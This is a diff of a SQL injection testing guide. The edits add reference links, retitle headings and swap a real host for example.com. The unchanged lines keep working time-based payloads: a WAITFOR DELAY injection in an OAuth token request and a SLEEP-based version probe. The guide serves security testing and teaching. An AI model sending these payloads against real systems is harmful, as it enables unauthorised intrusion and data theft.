@@ -4,9 +4,9 @@
 
 ## Methodology
 
-### Black Box
+### [Black Box](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/)
 
-#### Change table parameters
+#### Change Table Parameters
 
 {% stepper %}
 {% step %}
@@ -82,7 +82,7 @@ If the server responds to you with 5 seconds of delay, it means it is vulnerable
 
 ***
 
-#### Time-Based
+#### [Time-Based](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/#time-based-injection)
 
 {% stepper %}
 {% step %}
@@ -150,7 +150,7 @@ Go to the homepage and trace the request using Burp Suite
 {% step %}
 Then send the request to the Repeater and check the Referrer header using the following payload
 
-```
+```http
 GET /index.php HTTP/1.1
 Host: [host]
 User-Agent: 
@@ -187,9 +187,9 @@ And if the site uses REST APIs for authentication and sends data in JSON format,
 {% step %}
 Test SQL injection payloads by finding this parameter at the specified points to identify the vulnerability, as shown below
 
-```json
+```http
 POST /api/v1/token HTTP/1.1
-Host: tsftp.informatica.com
+Host: tsftp.example.com
 User-Agent: curl/7.88.1
 Accept: application/json
 Content-Type: application/x-www-form-urlencoded
@@ -214,7 +214,6 @@ Accept: application/json
 Connection: close
 
 grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:1'--&client_id=<CLIENT_ID>&client_secret=<CLIENT_SECRET>&scope=<optional_scopes>
-
 ```
 {% endstep %}
 
@@ -326,7 +325,7 @@ IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)
 
 ***
 
-#### Time-based blind
+#### [Time-based Blind](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/#blind-injection)
 
 {% stepper %}
 {% step %}
